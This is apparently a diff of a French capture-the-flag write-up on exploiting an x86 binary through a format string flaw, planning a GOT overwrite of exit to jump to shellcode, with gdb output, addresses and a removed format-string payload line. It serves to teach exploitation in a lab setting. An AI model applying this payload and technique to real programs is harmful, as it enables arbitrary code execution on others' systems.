@@ -9,26 +9,16 @@
 | **Architecture** | x86 |
 | **Exploit type** | format string attack |
 
+Le programme commence par nous demander une entrée, au début on peut penser à une sorte de `cat`, mais on remarque vite une vulnérabilité de type _format string attack_.
 
-10 %p
-
-printf reads from 40 octets
-
-stack at 144 + (3*4) = 156 (+ 0-15 ?)
-
-gets at esp+0x28 (156 - 40 = 116)
-
-so must write at 116 octets so index 29
-
-%4294956712d%29$n
-
-0xffffd6a8
-
+Le `printf` étant suivi par un `exit`, on peut imaginer assez vite qu'on doit faire un _got overwrite_.
 
 ```text
 (gdb) x 0x80497e0
 0x80497e0 <exit@got.plt>:       0x08048376
 ```
+
+Également, on trouve `0xffffd670` pour l'adresse à laquelle se trouve notre buffer dans la stack.
 
 On doit maintenant écrire l'adresse d'un `shellcode`, `0xffffd670` (`4294956656` en décimal) dans `0x080497e0`.
 
